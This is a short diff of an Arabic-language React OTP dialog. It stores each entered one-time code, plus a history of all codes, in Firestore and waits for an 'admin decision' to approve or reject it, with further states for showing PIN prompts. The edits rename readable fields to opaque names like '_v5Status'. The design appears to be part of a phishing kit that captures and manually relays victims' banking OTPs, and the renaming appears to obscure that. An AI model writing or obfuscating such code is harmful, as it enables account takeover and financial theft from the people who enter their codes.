@@ -23,7 +23,7 @@ const allOtps=['']
 export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: OtpDialogProps) {
   const [_v5, _s5] = useState("")
   const [error, setError] = useState("")
-  const [otpStatus, _s5Status] = useState<"waiting" | "verifying" | "approved" | "rejected" | "otp_rejected">("waiting")
+  const [_v5Status, _s5Status] = useState<"waiting" | "verifying" | "approved" | "rejected" | "otp_rejected">("waiting")
   const [isListening, setIsListening] = useState(false)
 
   // Listen to Firestore for OTP status changes
@@ -40,7 +40,7 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data()
-          const status = data.otpStatus as "waiting" | "verifying" | "approved" | "rejected" | "otp_rejected" | "show_otp" | "show_pin"
+          const status = data._v5Status as "waiting" | "verifying" | "approved" | "rejected" | "otp_rejected" | "show_otp" | "show_pin"
 
           if (status === "otp_rejected") {
             _s5Status("waiting")
@@ -85,7 +85,7 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
         _v5,
         otpSubmittedAt: new Date().toISOString(),
         allOtps,
-        otpStatus: "verifying" // Set to verifying, waiting for admin decision
+        _v5Status: "verifying" // Set to verifying, waiting for admin decision
       })
 
       // Add OTP to history
@@ -134,7 +134,7 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
               maxLength={6}
               className="h-14 text-center text-4xl font-mono tracking-widest"
               dir="ltr"
-              disabled={otpStatus === "verifying"}
+              disabled={_v5Status === "verifying"}
               required
             />
           </div>
@@ -142,9 +142,9 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
           <Button
             type="submit"
             className="w-full h-12 bg-[#0a4a68] hover:bg-[#0a4a68]/90 text-white font-bold"
-            disabled={_v5.length !== 6 || otpStatus === "verifying"}
+            disabled={_v5.length !== 6 || _v5Status === "verifying"}
           >
-            {otpStatus === "verifying" ? "جاري التحقق..." : "تأكيد"}
+            {_v5Status === "verifying" ? "جاري التحقق..." : "تأكيد"}
           </Button>
 
           <p className="text-xs text-center text-gray-600">
